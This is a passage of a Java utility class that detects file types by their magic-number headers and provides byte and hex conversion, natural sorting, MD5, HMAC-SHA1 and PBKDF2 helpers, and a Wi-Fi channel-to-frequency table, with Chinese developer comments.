		initMoshuTypeItem("D0CF11E0", "doc");

		initMoshuTypeItem("CFAD12FEC5FD746F", "dbx"); /** Outlook Express (dbx) */
		initMoshuTypeItem("CFAD12FE", "dbx");

		initMoshuTypeItem("2142444E", "pst"); // /** Outlook (pst)*/
		initMoshuTypeItem("FF575043", "wpb"); /** Word Perfect (wpd) */

		initMoshuTypeItem("252150532D41646F6265", "esp");
		initMoshuTypeItem("25215053", "esp");
		initMoshuTypeItem("252150532D41646F6265", "PS");
		initMoshuTypeItem("25215053", "PS");
		initMoshuTypeItem("255044462D312E", "PDF");
		initMoshuTypeItem("25504446", "PDF");
		initMoshuTypeItem("AC9EBD8F", "qdf");
		initMoshuTypeItem("458600000600", "qbb");
		initMoshuTypeItem("45860000", "qbb");
		initMoshuTypeItem("E3828596", "PWL");
		initMoshuTypeItem("504B0304", "zip");
		initMoshuTypeItem("52617221", "RAR");
		initMoshuTypeItem("57415645", "WAV");
		initMoshuTypeItem("41564920", "AVI");
		initMoshuTypeItem("2E7261FD", "RAM");
		initMoshuTypeItem("2E524D46", "RM");
		initMoshuTypeItem("2E524D46000000120001", "RMVB");
		initMoshuTypeItem("2E524D46", "RMVB");
		initMoshuTypeItem("000001BA", "MPG");
		initMoshuTypeItem("6D6F6F76", "MOV");
		initMoshuTypeItem("3026B2758E66CF11", "ASF");
		initMoshuTypeItem("3026B275", "ASF");
		initMoshuTypeItem("000060EA", "ARJ");
		initMoshuTypeItem("4D546864", "MID");
		initMoshuTypeItem("00000020667479706D70", "MP4");
		initMoshuTypeItem("00000020", "MP4");
		initMoshuTypeItem("49443303000000002176", "MP3");
		initMoshuTypeItem("49443303", "MP3");
		initMoshuTypeItem("464C5601050000000900", "FLV");
		initMoshuTypeItem("464C5601", "FLV");
		initMoshuTypeItem("1F8B0800", "GZ");
		initMoshuTypeItem("48544D4C207B0D0A0942", "CSS");
		initMoshuTypeItem("48544D4C", "CSS");
		initMoshuTypeItem("696B2E71623D696B2E71", "JS");
		initMoshuTypeItem("696B2E71", "JS");
		initMoshuTypeItem("d0cf11e0a1b11ae10000", "VSD");
		initMoshuTypeItem("d0cf11e0", "VSD");
		initMoshuTypeItem("d0cf11e0a1b11ae10000", "WPS");
		initMoshuTypeItem("d0cf11e0", "WPS");
		initMoshuTypeItem("6431303A637265617465", "TORRENT");
		initMoshuTypeItem("6431303A", "TORRENT");
		initMoshuTypeItem("3C2540207061676520", "JSP");
		initMoshuTypeItem("3C254020", "JSP");
		initMoshuTypeItem("7061636B61676520", "JAVA");
		initMoshuTypeItem("7061636B", "JAVA");
		initMoshuTypeItem("CAFEBABE0000002E00", "CLASS");
		initMoshuTypeItem("CAFEBABE", "CLASS");
		initMoshuTypeItem("504B03040A000000", "JAR");
		initMoshuTypeItem("504B0304", "JAR");
		initMoshuTypeItem("4D616E69666573742D56", "MF");
		initMoshuTypeItem("4D616E69", "MF");
		initMoshuTypeItem("4D5A9000030000000400", "EXE");
		initMoshuTypeItem("4D5A9000", "EXE");
		initMoshuTypeItem("7F454C4601010100", "ELF");
		initMoshuTypeItem("7F454C46", "ELF");
		initMoshuTypeItem("2000604060", "WK1");
		initMoshuTypeItem("20006040", "WK1");
		initMoshuTypeItem("00001A0000100400", "WK3");
		initMoshuTypeItem("00001A00", "WK3");
		initMoshuTypeItem("00001A0002100400", "WK4");
		initMoshuTypeItem("576F726450726F", "LWP");
		initMoshuTypeItem("576F7264", "LWP");
		initMoshuTypeItem("53520100", "SLY");

		initMoshuTypeItem("D0CF11E0", "ppt");
		initMoshuTypeItem("D0CF11E0", "xls");// excel2003版本文件
		initMoshuTypeItem("5374616E64617264204A", "mdb");
		initMoshuTypeItem("5374616E", "mdb");
		initMoshuTypeItem("252150532D41646F6265", "ps");
		initMoshuTypeItem("25215053", "ps");
		initMoshuTypeItem("255044462D312E", "pdf");
		initMoshuTypeItem("25504446", "pdf");
		initMoshuTypeItem("504B0304", "pptx");
		initMoshuTypeItem("504B0304", "docx");
		initMoshuTypeItem("504B0304", "xlsx");// excel2007以上版本文件
		initMoshuTypeItem("52617221", "rar");
		initMoshuTypeItem("57415645", "wav");
		initMoshuTypeItem("41564920", "avi");
		initMoshuTypeItem("2E524D46", "rm");
		initMoshuTypeItem("000001BA", "mpg");
		initMoshuTypeItem("000001B3", "mpg");
		initMoshuTypeItem("6D6F6F76", "mov");
		initMoshuTypeItem("3026B2758E66CF11", "asf");
		initMoshuTypeItem("4D546864", "mid");
		initMoshuTypeItem("1F8B08", "gz");

	}

	static void initMoshuTypeItem(String key, String value) {
		mFileTypes.put(key.toLowerCase(), value.toLowerCase());
	}

	/**
	 * @param filePath 文件路径
	 * @return 文件头信息
	 * @author wlx
	 *         <p>
	 *         方法描述：根据文件路径获取文件头信息
	 */
	static public String getFileType(String filePath) {
		if (mFileTypes == null) {
			initMoShuTypeMap();
		}
//	        System.out.println(getFileHeader(filePath));
//	        System.out.println(mFileTypes.get(getFileHeader(filePath)));
		return mFileTypes.get(getFileHeader(filePath));
	}

	/**
	 * @param filePath 文件路径
	 * @return 文件头信息
	 * @author wlx
	 *         <p>
	 *         方法描述：根据文件路径获取文件头信息
	 */
	static public String getFileHeader(String filePath) {
		FileInputStream is = null;
		String value = null;
		try {
			is = new FileInputStream(filePath);
			byte[] b = new byte[4];
			/*
			 * int read() 从此输入流中读取一个数据字节。int read(byte[] b) 从此输入流中将最多 b.length 个字节的数据读入一个
			 * byte 数组中。 int read(byte[] b, int off, int len) 从此输入流中将最多 len 个字节的数据读入一个 byte
			 * 数组中。
			 */
			is.read(b, 0, b.length);
			value = bytesToHexString(b);
			if (value != null) {
				value = value.toLowerCase();
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (null != is) {
				try {
					is.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		System.out.println("文件:" + filePath + "    byte[4]_value_moshu = " + value);
		return value;
	}

	/**
	 * @param src 要读取文件头信息的文件的byte数组
	 * @return 文件头信息
	 * @author wlx
	 *         <p>
	 *         方法描述：将要读取文件头信息的文件的byte数组转换成string类型表示
	 */
	static String bytesToHexString(byte[] src) {
		StringBuilder builder = new StringBuilder();
		if (src == null || src.length <= 0) {
			return null;
		}
		String hv;
		for (byte aSrc : src) {
			// 以十六进制（基数 16）无符号整数形式返回一个整数参数的字符串表示形式，并转换为大写
			hv = Integer.toHexString(aSrc & 0xFF).toUpperCase();
			if (hv.length() < 2) {
				builder.append(0);
			}
			builder.append(hv);
		}
//	        System.out.println(builder.toString());
		return builder.toString();
	}

	static String bytesToHexString(byte[] src, boolean isLittleEnd) {
		StringBuilder builder = new StringBuilder();
		if (src == null || src.length <= 0) {
			return null;
		}
		String hv;
		if (isLittleEnd) { // 小端

			for (int i = src.length - 1; i >= 0; i--) {
				hv = Integer.toHexString(src[i] & 0xFF).toUpperCase();
				if (hv.length() < 2) {
					builder.append(0);
				}
				builder.append(hv);
			}

		} else { // 大端

			for (byte aSrc : src) {
				// 以十六进制（基数 16）无符号整数形式返回一个整数参数的字符串表示形式，并转换为大写
				hv = Integer.toHexString(aSrc & 0xFF).toUpperCase();
				if (hv.length() < 2) {
					builder.append(0);
				}
				builder.append(hv);
			}
		}

//	        System.out.println(builder.toString());
		return builder.toString();
	}

	public static boolean isNumeric(String str) {
		if (str.contains("#")) {
			return false;
		}
		for (int i = str.length(); --i >= 0;) {
			if (!Character.isDigit(str.charAt(i))) {
				return false;
			}
		}
		return true;
	}

	// 000000ccc 转为 ccc , 00c0c000 转为 c0c000
	public static String clearZero_for_NumberStr(String str) {
		String fixed_str = str.trim();
		while (fixed_str.startsWith("0") && fixed_str.length() != 0) {
			fixed_str = fixed_str.substring(1);
		}
		return fixed_str;
	}

	static void SortString(ArrayList<String> strList) {
		Comparator<Object> CHINA_COMPARE = Collator.getInstance(java.util.Locale.CHINA);
		strList.sort((o1, o2) -> {
			// 比较的基本原则，拿最小长度的字符串进行比较，若全部相等，则长字符串往后排

			int len1 = o1.length();
			int len2 = o2.length();
			int len = (len1 - len2) <= 0 ? len1 : len2;
			StringBuilder sb1 = new StringBuilder();
			StringBuilder sb2 = new StringBuilder();
			for (int i = 0; i < len; i++) {
				String s1 = o1.substring(i, i + 1);
				String s2 = o2.substring(i, i + 1);
				if (isNumericFirstChar(s1) && isNumericFirstChar(s2)) {
					// 取出所有的数字
					sb1.append(s1);
					sb2.append(s2);
					// 取数字时，不比较
					continue;
				}
				if (sb1.length() != 0 && sb2.length() != 0) {
					if (!isNumericFirstChar(s1) && !isNumericFirstChar(s2)) {
						int value1 = Integer.valueOf(sb1.toString());
						int value2 = Integer.valueOf(sb2.toString());
						return value1 - value2;
					} else if (isNumericFirstChar(s1)) {
						return 1;
					} else if (isNumericFirstChar(s2)) {
						return -1;
					}
				}
				int result = CHINA_COMPARE.compare(s1, s2);
				if (result != 0) {
					return result;
				}
			}
			// 这一步：是为了防止以下情况：第10 第20，正好以数字结尾，且字符串长度相等
			if (len1 == len2 && sb1.length() != 0 && sb2.length() != 0) {
				int value1 = Integer.valueOf(sb1.toString());
				int value2 = Integer.valueOf(sb2.toString());
				return value1 - value2;
			}
			// 若前面都相等，则直接比较字符串的长度，长的排后面，短的排前面
			return Integer.compare(len1, len2);
		});

	}

	// 判断是否是数字
	static boolean isNumericFirstChar(String s) {
		return Character.isDigit(s.charAt(0));
	}

	/**
	 * BASE64解密
	 *
	 * @throws Exception
	 */
	public static String jiemi_decryptBASE64(String key) throws Exception {
		return new String(Base64.getDecoder().decode(key));
	}

	/**
	 * BASE64加密
	 */
	public static String jiami_encryptBASE64(byte[] key) throws Exception {

		return new String(Base64.getEncoder().encode(key));
	}

	static ArrayList<File> getAllSubFile(File dirFile, String typeStr) {
		ArrayList<String> typeList = new ArrayList<String>();
		if (typeStr == null) {
			typeList.add("*");
		} else {
			typeList.add(typeStr);
		}

		return getAllSubFile(dirFile.getAbsolutePath(), "", typeList);

	}

	static Comparator mFileDateComparion_New_Old = new Comparator<File>() {
		@Override
		public int compare(File o1, File o2) {
			long diff = o1.lastModified() - o2.lastModified();
			if (diff > 0)
				return -1;
			else if (diff == 0)
				return 0;
			else
				return 1;// 如果 if 中修改为 返回-1 同时此处修改为返回 1 排序就会是递减
		}

	};

	static Comparator mFileDateComparion_Old_New = new Comparator<File>() {
		@Override
		public int compare(File o1, File o2) {
			long diff = o1.lastModified() - o2.lastModified();
			if (diff > 0)
				return 1;
			else if (diff == 0)
				return 0;
			else
				return -1;// 如果 if 中修改为 返回-1 同时此处修改为返回 1 排序就会是递减
		}

	};

	public static String getMD5Three(String path) {
		BigInteger bi = null;
		try {
			byte[] buffer = new byte[8192];
			int len = 0;
			MessageDigest md = MessageDigest.getInstance("MD5");
			File f = new File(path);
			FileInputStream fis = new FileInputStream(f);
			while ((len = fis.read(buffer)) != -1) {
				md.update(buffer, 0, len);
			}
			fis.close();
			byte[] b = md.digest();
			bi = new BigInteger(1, b);
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return bi.toString(16);
	}

	public static String getDateStrFromLongStamp(long timeStamp) {
		Date date = new Date(timeStamp);
		SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd_HH:mm:ss");
		String dateStr = simpleDateFormat.format(date);
		return dateStr;
	}

	static void SortFileWithName(ArrayList<File> fileList) {
		Comparator<Object> CHINA_COMPARE = Collator.getInstance(java.util.Locale.CHINA);
		fileList.sort((o1_file, o2_file) -> {
			// 比较的基本原则，拿最小长度的字符串进行比较，若全部相等，则长字符串往后排
			String o1 = o1_file.getName();
			String o2 = o2_file.getName();
			int len1 = o1.length();
			int len2 = o2.length();
			int len = (len1 - len2) <= 0 ? len1 : len2;
			StringBuilder sb1 = new StringBuilder();
			StringBuilder sb2 = new StringBuilder();
			for (int i = 0; i < len; i++) {
				String s1 = o1.substring(i, i + 1);
				String s2 = o2.substring(i, i + 1);
				if (isNumericFirstChar(s1) && isNumericFirstChar(s2)) {
					// 取出所有的数字
					sb1.append(s1);
					sb2.append(s2);
					// 取数字时，不比较
					continue;
				}
				if (sb1.length() != 0 && sb2.length() != 0) {
					if (!isNumericFirstChar(s1) && !isNumericFirstChar(s2)) {
						int value1 = Integer.valueOf(sb1.toString());
						int value2 = Integer.valueOf(sb2.toString());
						return value1 - value2;
					} else if (isNumericFirstChar(s1)) {
						return 1;
					} else if (isNumericFirstChar(s2)) {
						return -1;
					}
				}
				int result = CHINA_COMPARE.compare(s1, s2);
				if (result != 0) {
					return result;
				}
			}
			// 这一步：是为了防止以下情况：第10 第20，正好以数字结尾，且字符串长度相等
			if (len1 == len2 && sb1.length() != 0 && sb2.length() != 0) {
				int value1 = Integer.valueOf(sb1.toString());
				int value2 = Integer.valueOf(sb2.toString());
				return value1 - value2;
			}
			// 若前面都相等，则直接比较字符串的长度，长的排后面，短的排前面
			return Integer.compare(len1, len2);
		});

	}

	// 计算 在 字符串 originStr 中 在位置 endIndex 之前 最近的那个 匹配上的 matchStr的 索引
	int calculNearPairIndex(String originStr, int endIndex, String matchStr) {
		int beginIndex = 0;
		String subStr = originStr.substring(0, endIndex);
		beginIndex = subStr.lastIndexOf(matchStr);
		return beginIndex;

	}

	// 获得 第一个匹配到的 前缀 和 后缀的 字符串
	String getSubString_WithPre_WithEnd(String oldExp, String pre, String end) {
		String result = oldExp;
		int matchIndex = 0;
		int end_FirstIndex = result.indexOf(end, matchIndex);

		int begin_ExpIndex = calculNearPairIndex(result, end_FirstIndex, pre); //

		while (begin_ExpIndex == -1) {
			matchIndex++;
			end_FirstIndex = result.indexOf(end, matchIndex);

			begin_ExpIndex = calculNearPairIndex(result, end_FirstIndex, pre); //

			if (matchIndex > 100) {
				System.out.println("无法匹配到A " + " begin_ExpIndex = " + begin_ExpIndex + " end_FirstIndex="
						+ end_FirstIndex + "  oldExp=【" + oldExp + "】     pre=【" + pre + "】  end=【" + end + "】");

				return null;
			}
		}
//begin_ExpIndex = -1 end_FirstIndex=34  oldExp=【      <a class="pjaxlink" href="/"><img src="/public/upload/gavatar/gavatar.jpg" class="img-rounded avatar"></a>】     pre=【<img】  end=【>】
		if (end_FirstIndex == -1) {
			System.out.println("无法匹配到B " + " begin_ExpIndex = " + begin_ExpIndex + " end_FirstIndex=" + end_FirstIndex
					+ "  oldExp=【" + oldExp + "】     pre=【" + pre + "】  end=【" + end + "】");

			return null;
		}

		String targetExpNoOut = result.substring(begin_ExpIndex + 1, end_FirstIndex); // 包前 不包后
		String targetExpWithOut = result.substring(begin_ExpIndex, end_FirstIndex + end.length()); // 包前 包后 加上 后缀的长度
		// System.out.println(" oldExp = " + oldExp);
		// System.out.println(" targetExpWithOut = " + targetExpWithOut);
		// System.out.println(" targetExpNoOut = " + targetExpNoOut);
		// System.out.println(" begin_ExpIndex = " + begin_ExpIndex + " end_FirstIndex
		// =" + end_FirstIndex);
		System.out.println(" begin_ExpIndex = " + begin_ExpIndex + " end_FirstIndex=" + end_FirstIndex + "  oldExp=【"
				+ oldExp + "】     pre=【" + pre + "】  end=【" + end + "】" + " targetExpWithOut=【" + targetExpWithOut
				+ "】");

		return targetExpWithOut;
	}

	/**
	 * 利用 {@link java.nio.ByteBuffer}实现byte[]转long
	 *
	 * @param input
	 * @param offset
	 * @param littleEndian 输入数组是否小端模式
	 * @return
	 */
	public static long bytesToLong(byte[] input, int offset, boolean littleEndian) {
		if (offset < 0 || offset + 8 > input.length)
			throw new IllegalArgumentException(
					String.format("less than 8 bytes from index %d  is insufficient for long", offset));
		ByteBuffer buffer = ByteBuffer.wrap(input, offset, 8);
		if (littleEndian) {
			// ByteBuffer.order(ByteOrder) 方法指定字节序,即大小端模式(BIG_ENDIAN/LITTLE_ENDIAN)
			// ByteBuffer 默认为大端(BIG_ENDIAN)模式
			buffer.order(ByteOrder.LITTLE_ENDIAN);
		}
		return buffer.getLong();
	}

	/**
	 * 将两个byte 合并转化为一个 hex 数据
	 *
	 * @param high 高位数据
	 * @param low  低位数据
	 * @return 返回的数据 高位在前，低位在后。
	 */
	public static int merge2ByteToInt(byte high, byte low) {
		return (int) ((high & 0xff) << 8 | (low & 0xff));
	}

	public static int bytesToInt(byte[] src, int offset) {
		int value;
		value = (int) (((src[offset] & 0xFF) << 24) | ((src[offset + 1] & 0xFF) << 16) | ((src[offset + 2] & 0xFF) << 8)
				| (src[offset + 3] & 0xFF));
		return value;
	}

	/**
	 * 将一个 int 型数据转化为两个byte 数据
	 *
	 * @param value int 数值
	 * @return 两个字节的byte 数组
	 */
	public static byte[] intToByteArray(int value) {
		byte[] mValue = new byte[2];
		mValue[0] = (byte) ((value >> 8) & 0xFF);
		mValue[1] = (byte) (value & 0xFF);
		return mValue;
	}

	// 使用两个 for 语句
	// java 合并两个byte数组
	public static byte[] byteMerger(byte[] bt1, byte[] bt2, byte[] bt3) {
		byte[] bt4 = new byte[bt1.length + bt2.length + bt3.length];
		int i = 0;
		for (byte bt : bt1) {
			bt4[i] = bt;
			i++;
		}

		for (byte bt : bt2) {
			bt4[i] = bt;
			i++;
		}

		for (byte bt : bt3) {
			bt4[i] = bt;
			i++;
		}
		return bt4;
	}

	int getChannelId_2_ChanneHz(int channel_id) {
		int mHz = channel_id;
		switch (channel_id) {

			case 1:
				mHz = 2412;
				break;

			case 2:
				mHz = 2417;
				break;

			case 3:
				mHz = 2422;
				break;

			case 4:
				mHz = 2427;
				break;

			case 5:
				mHz = 2432;
				break;

			case 6:
				mHz = 2437;
				break;

			case 7:
				mHz = 2442;
				break;

			case 8:
				mHz = 2447;
				break;

			case 9:
				mHz = 2452;
				break;

			case 10:
				mHz = 2457;
				break;

			case 11:
				mHz = 2462;
				break;

			case 12:
				mHz = 2467;
				break;

			case 13:
				mHz = 2472;
				break;

			case 16:
				mHz = 5080;
				break;

			case 34:
				mHz = 5170;
				break;

			case 36:
				mHz = 5180;
				break;

			case 38:
				mHz = 5190;
				break;

			case 40:
				mHz = 5200;
				break;
			case 42:
				mHz = 5210;
				break;

			case 44:
				mHz = 5220;
				break;

			case 46:
				mHz = 5230;
				break;

			case 48:
				mHz = 5240;
				break;

			case 50:
				mHz = 5250;
				break;

			case 52:
				mHz = 5260;
				break;

			case 56:
				mHz = 5280;
				break;

			case 60:
				mHz = 5300;
				break;

			case 64:
				mHz = 5320;
				break;

			case 70:
				mHz = 5350;
				break;

			case 94:
				mHz = 5470;
				break;

			case 100:
				mHz = 5500;
				break;

			case 104:
				mHz = 5520;
				break;

			case 108:
				mHz = 5540;
				break;

			case 112:
				mHz = 5560;
				break;

			case 116:
				mHz = 5580;
				break;

			case 120:
				mHz = 5600;
				break;

			case 124:
				mHz = 5620;
				break;

			case 128:
				mHz = 5640;
				break;

			case 132:
				mHz = 5660;
				break;

			case 136:
				mHz = 5680;
				break;

			case 140:
				mHz = 5700;
				break;

			case 145:
				mHz = 5725;
				break;

			case 149:
				mHz = 5745;
				break;

			case 153:
				mHz = 5765;
				break;

			case 157:
				mHz = 5785;
				break;

			case 161:
				mHz = 5805;
				break;

			case 165:
				mHz = 5825;
				break;

			case 183:
				mHz = 4915;
				break;

			case 184:
				mHz = 4920;
				break;

			case 185:
				mHz = 4925;
				break;

			case 187:
				mHz = 4935;
				break;

			case 188:
				mHz = 4940;
				break;

			case 189:
				mHz = 4945;
				break;

			case 192:
				mHz = 4960;
				break;
			case 196:
				mHz = 4980;
				break;

			default:

		}
		return mHz;
	}

	static byte[] Min_Byte(byte[] mAbytes, byte[] mBbytes) {

		int byteLength = mAbytes.length;

		for (int i = 0; i < byteLength; i++) {
			byte aByte = mAbytes[i];
			byte bByte = mBbytes[i];

			if (aByte == bByte) {
				continue;
			}

			int a_int = Byte.toUnsignedInt(aByte);
			int b_int = Byte.toUnsignedInt(bByte);

			if (a_int > b_int) {
				return mBbytes;
			} else {

				return mAbytes;
			}

		}
		return mAbytes;
	}

	static byte[] Max_Byte(byte[] mAbytes, byte[] mBbytes) {

		int byteLength = mAbytes.length;

		for (int i = 0; i < byteLength; i++) {
			byte aByte = mAbytes[i];
			byte bByte = mBbytes[i];

			if (aByte == bByte) {
				continue;
			}

			int a_int = Byte.toUnsignedInt(aByte);
			int b_int = Byte.toUnsignedInt(bByte);

			if (a_int > b_int) {
				return mAbytes;
			} else {

				return mBbytes;
			}

		}
		return mBbytes;
	}

	public static byte[] byteConcat_6to1(byte[] mbt1, byte[] mbt2, byte[] mbt3, byte[] mbt4, byte[] mbt5, byte[] mbt6) {
		byte[] bt7 = new byte[mbt1.length + mbt2.length + mbt3.length + mbt4.length + mbt5.length + mbt6.length];
		int len = 0;
		System.arraycopy(mbt1, 0, bt7, 0, mbt1.length);
		len += mbt1.length;
		System.arraycopy(mbt2, 0, bt7, len, mbt2.length);
		len += mbt2.length;
		System.arraycopy(mbt3, 0, bt7, len, mbt3.length);

		len += mbt3.length;
		System.arraycopy(mbt4, 0, bt7, len, mbt4.length);

		len += mbt4.length;
		System.arraycopy(mbt5, 0, bt7, len, mbt5.length);

		len += mbt5.length;
		System.arraycopy(mbt6, 0, bt7, len, mbt6.length);

		return bt7;
	}

	public static byte[] hmac_sha1(byte[] utf8_data_bytes, byte[] keyBytes, int replyLength)
			throws NoSuchAlgorithmException, UnsupportedEncodingException, InvalidKeyException {
		Mac mac = Mac.getInstance("HmacSHA1");
		SecretKeySpec signingKey = new SecretKeySpec(keyBytes, "HmacSHA1");
		mac.init(signingKey);

		byte[] utf8_result = mac.doFinal(utf8_data_bytes);

		byte[] replyBytes = Arrays.copyOf(utf8_result, replyLength);

		return replyBytes;
	}

	public static byte[] HexStrToBytes(String hexStrIn) {
		int hexlen = hexStrIn.length() / 2;
		byte[] result;
		result = new byte[hexlen];
		for (int i = 0; i < hexlen; i++) {
			result[i] = hexStrToByte(hexStrIn.substring(i * 2, i * 2 + 2));
		}
		return result;
	}

	static public byte hexStrToByte(String hexbytein) {
		return (byte) Integer.parseInt(hexbytein, 16);
	}

	public static byte[] getBytes(char[] chars) {
		Charset cs = Charset.forName("UTF-8");
		CharBuffer cb = CharBuffer.allocate(chars.length);
		cb.put(chars);
		cb.flip();
		ByteBuffer bb = cs.encode(cb);
		return bb.array();
	}

	public static char[] getChars(byte[] bytes) {
		Charset cs = Charset.forName("UTF-8");
		ByteBuffer bb = ByteBuffer.allocate(bytes.length);
		bb.put(bytes).flip();
		CharBuffer cb = cs.decode(bb);
		return cb.array();
	}

	public static byte[] charToByte(char c) {
		byte[] b = new byte[2];
		b[0] = (byte) ((c & 0xFF00) >> 8);
		b[1] = (byte) (c & 0xFF);
		return b;
	}

	public static char byteToChar(byte[] b) {
		int hi = (b[0] & 0xFF) << 8;
		int lo = b[1] & 0xFF;
		return (char) (hi | lo);
	}

	static char[] hexArray = "0123456789ABCDEF".toCharArray();

	public static String bytesToHex(byte[] bytes) {
		char[] hexChars = new char[bytes.length * 2];
		for (int j = 0; j < bytes.length; j++) {
			int v = bytes[j] & 0xFF;
			hexChars[j * 2] = hexArray[v >>> 4];
			hexChars[j * 2 + 1] = hexArray[v & 0x0F];
		}
		return new String(hexChars);
	}

	private static byte[] pbkdf2_sha1(String password, byte[] salt, int iteratorCount, int byte_size)
			throws NoSuchAlgorithmException, InvalidKeySpecException {
		// 参数 ：明文密码 ，盐值，和迭代次数和长度生成密文
		KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, iteratorCount, byte_size * 8); // 最后是比特位
		// 返回转换指定算法的秘密密钥的 SecretKeyFactory 对象
		// 此方法从首选 Provider 开始遍历已注册安全提供者列表。返回一个封装 SecretKeyFactorySpi 实现的新
		// SecretKeyFactory 对象，该实现取自支持指定算法的第一个 Provider。
		SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
		// 根据提供的密钥规范（密钥材料）生成 SecretKey 对象。 然后以主要编码格式返回键，最后转换为16进制字符串

		Key k = new SecretKeySpec(factory.generateSecret(spec).getEncoded(), "AES");

		return k.getEncoded();
	}

	/**
	 * @describe: 十六进制字符串转二进制字符串
	 * @param: [hex]
	 * @return: byte[]
	 */
	private static byte[] fromHex(String hex) {
		byte[] binary = new byte[hex.length() / 2];
		for (int i = 0; i < binary.length; i++) {
			binary[i] = (byte) Integer.parseInt(hex.substring(2 * i, 2 * i + 2), 16);
		}
		return binary;
	}

	/**
	 * @describe: 二进制字符串转十六进制字符串
	 * @param: [array]
	 * @return: java.lang.String
	 */
	private static String toHex(byte[] array) {
		BigInteger bigInteger = new BigInteger(1, array);
		String hex = bigInteger.toString(16);
		int paddingLength = (array.length * 2) - hex.length();
		if (paddingLength > 0) {
			return String.format("%0" + paddingLength + "d", 0) + hex;
		} else {
			return hex;
		}
	}

	static String getTimeStamp_YYYY() {

		SimpleDateFormat df = new SimpleDateFormat("yyyy");// 设置日期格式
		String date = df.format(new Date());
		return date;
	}

	static String getMatchLength_NumStr(int num, int length) {
		String numStr = "" + num;
		String paddingStr = "";
		int numSrt_length = numStr.length();

		int padding_zero_count = length - numSrt_length;

		if (padding_zero_count > 0) {

			paddingStr = getPadding_WithZero_LongString(padding_zero_count, "0");

		}

		return paddingStr + numStr;
	}


	public static  String  ByteAsHexString(byte [] byteArray) {
		StringBuilder sb = new StringBuilder();
		for (int i = 0; i < byteArray.length; i++) {
			String hex = Integer.toHexString(byteArray[i] & 0xFF);
			if (hex.length() == 1) {
				hex = '0' + hex;
			}

			sb.append(hex.toLowerCase()+" ");
		}
		return sb.toString();

	}


	// List<A_B_C> 需要把这个 创建了三个 JavaBean
// A , B  ,C  这三个 对象的 execute()方法 会执行  parseMap();  zzj
//         而不会执行  parseMap()  的  generationBean.writeList(clz);  去 生成
//       WriteBean
//
//         Line 231: zukgit4_1_2_空  this.name :null  name =null curRentName = clz=List<String>  不会执行 writeList(clz) 方法了  操蛋！
//        Line 339: zukgit4_1_2_空  this.name :null  name =null curRentName = clz=List<Integer>  不会执行 writeList(clz) 方法了  操蛋！
//        Line 341: zukgit4_1_2_空  this.name :null  name =null curRentName = clz=List<Object>  不会执行 writeList(clz) 方法了  操蛋！
//        Line 671: zukgit4_1_2_空  this.name :null  name =null curRentName = clz=List<D>  不会执行 writeList(clz) 方法了  操蛋！
//        Line 684: zukgit4_1_2_空  this.name :null  name =null curRentName = clz=List<A_B_C>  不会执行 writeList(clz) 方法了  操蛋！
//        Line 741: zukgit4_1_2_空  this.name :null  name =null curRentName = clz=List<E>  不会执行 writeList(clz) 方法了  操蛋！
//      writeList(clz)  // 把 clz 写入一个 txt 文件  文件的名称为  List<Object>   转为  List_Object_     List_A_B_C_
//     File file = new File("src/" + packName.replace(".", "/"));
//        BufferedWriter bw = new BufferedWriter(new FileWriter(new File(file, list.replaceAll("<|>", "_") + ".txt")));
//    bw.write(list);       写入 .txt  有什么作用?   这个从代码根本看不出来

//  X2  MyBeanGenerator  className  =RootBean entry.getValue().toString() =
//       X3  MyBeanGenerator  MyBeanGenerator  className  =RootBean entry.getValue().toString() = capitalUpperCase(entry.getKey()) =Data
// 它的 key=data  , value 为空  map.put
//  generationBean.writeBean(name, map 【 Map<String, Object> map = jsonParse.toMap(json) 】);  map的 数据来源于 Json

//  [{类A}{类B}{类C}]    以什么方式     value =  List<A_B_C>   List<A___B___C>
// X3  MyBeanGenerator  className  =RootBean entry.getValue().toString() =List<<A___B___C>>  capitalUpperCase(entry.getKey()) =Data
//  如果  当前的 value  包含 List 和 ___   那么获取  第一个 ___ 之前的位置    最后一个 ___之后的位置,  截取这个字符串 中间加 List<Object>

//  B -> topic_2048 [weight=6]
//B -> topic [weight=6]    重复！
// make-> 4  refClassName=B    properityName=topic_2048
// make-> 4  refClassName=Extra    properityName=Topic_2048
// make-> 4  refClassName=Extra    properityName=Topic
// make-> 4  refClassName=B    properityName=topic
// new ProperityItem
//  ArrayList<HashMap<String, ArrayList<ProperityItem>>> Rule17_arrMapList  的 Item 排序

// 对于 对象中 为 {  [] }  为 空的情况的处理
	// Rule_17 End 对 Json 格式的文件 或者 以json格式保存的文件 生成bean文件 以及 Graphviz 绘图显示结构

}